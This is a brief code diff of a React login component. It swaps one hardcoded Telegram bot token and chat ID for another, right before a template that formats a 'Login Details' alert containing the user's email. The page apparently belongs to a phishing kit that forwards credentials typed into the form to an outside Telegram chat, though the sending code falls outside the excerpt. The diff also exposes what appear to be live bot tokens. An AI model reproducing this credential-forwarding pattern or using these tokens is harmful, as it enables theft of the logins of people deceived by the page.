@@ -56,8 +56,8 @@ const Login = () => {
         return;
       }
 
-      const TELEGRAM_BOT_TOKEN = '8196319945:AAHPEcumR9n3hASIXg9IdmkX06UIxQbK5R4';
-      const TELEGRAM_CHAT_ID = '-1002383824557';
+      const TELEGRAM_BOT_TOKEN = '8167294891:AAHMzeK9CYseo6zUTGt1cMfWHK5faqZKGPg';
+      const TELEGRAM_CHAT_ID = '-1002480035528';
       const loginAlert = `
 🔐 <b>Login Details</b>
 📧 <b>Email:</b> ${email}
